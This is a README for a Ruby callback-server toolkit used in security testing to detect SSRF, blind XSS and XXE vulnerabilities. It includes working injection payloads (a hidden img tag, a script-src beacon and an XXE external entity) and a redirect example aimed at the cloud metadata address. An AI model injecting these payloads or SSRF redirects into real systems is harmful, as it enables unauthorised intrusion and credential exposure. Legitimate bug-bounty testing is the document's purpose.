# Ground control
This is a collection of most of my scripts that I use to debug Server Side Request Forgery (SSRF), blind XSS, and insecure XXE processing vulnerabilities. This is still a work in progress, as I'm still collecting all the scripts that I have lingering around. Before using these scripts, I used to rewrite these scripts most of the time or set up listeners with `netcat`. That wasn't scalable, so I started collecting the scripts in a repository, which can be closed easily every time it's needed it on a server.

## Requirements
Running this script requires Ruby 2.3, a valid SSL certificate for a domain you own, and a web server that allows to open port `80`, `443`, `8080`, and `8443`. Port `80` and `443` are used to serve simple web traffic. Port `8080` is an alternative HTTP port that can be useful when traffic on port `80` is blocked. Port `8443` is an alternative port for HTTPS traffic, with the difference that it serves a self-signed SSL certificate. I use this port to determine whether the server does SSL certificate validation. It does not warrant a security report by itself, but is often useful to mention when you're filing the SSRF vulnerability.

## Setting up
Clone this repository and install the required components by running `install.sh`. After that, run `start.sh` to start to listen on all ports. For now, `root` privileges are required because it listens on port `80` and `443`. A future version might solve this problem by switching to a different user context after startup.

## Functions

### Redirects
The `/redirect` endpoint is used to redirect a request to another server or endpoint. This may assist you when you need an external server to redirect back to an internal system. See below for examples.

```
curl -vv "http://server/redirect?url=http://169.254.169.254/latest/meta-data/"
```

### Ping Pong
Sometimes, you simply need a page that responds with a certain body and headers. The `/ping_pong` endpoint does exactly that. Here's a few examples.

```
curl -vv "http://server/ping_pong?body=%3ch1%3eHello%3c/h1%3e"
```

### Blind callbacks
To figure out of an inaccessible system is executing your HTML or XSS payload, add an item the `callback_tokens` in `config.json`. The structure is shown below. This callback contains information where you injected your payload. This will help you identify the root cause of the vulnerability if you receive a callback. Every unique combination of parameter, host, port, path, and method is supposed to have its own `callback_token`.

```
{
  "callback_tokens": {
    "ee34a1791ab345f789": {
      "host": "hackerone.com",
      "port": 443,
      "ssl": true,
      "path": "/webhooks",
      "parameter": "url",
      "method": "POST"
    }
  }
}
```

Depending on what type of vulnerability you want to test for, you have to construct a payload. See below for an example for HTML injections and XSS vulnerabilities. Then, submit the payload to the injection point. You'll see a log entry in `logs/access_log` when a request with that `callback_token` was triggered. Most of the time, I use `tail -f logs/access_log` to see if something triggered.

**HTML injection**
```
<img src="https://server/pixel?callback_token=ee34a1791ab345f789" style="display:none;"/>
```

**Blind XSS**
```
<script src="https://server/collect?callback_token=ee34a1791ab345f789"></script>
```

**XXE**
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://server/pixel?callback_token=ee34a1791ab345f789">
]>
<r>&sp;</r>
```

### Starting another server
The server listens on port `80`, `443`, `8080`, and `8443` by default. However, if you want to start another server on a different port, run `ruby app/server.rb -p :port`. To use SSL, append `-cert :cert.pem`. This is especially useful when a potential SSRF vulnerability only allows to connect on certain ports. Say bye to all the Apache and nginx configuration hacking!
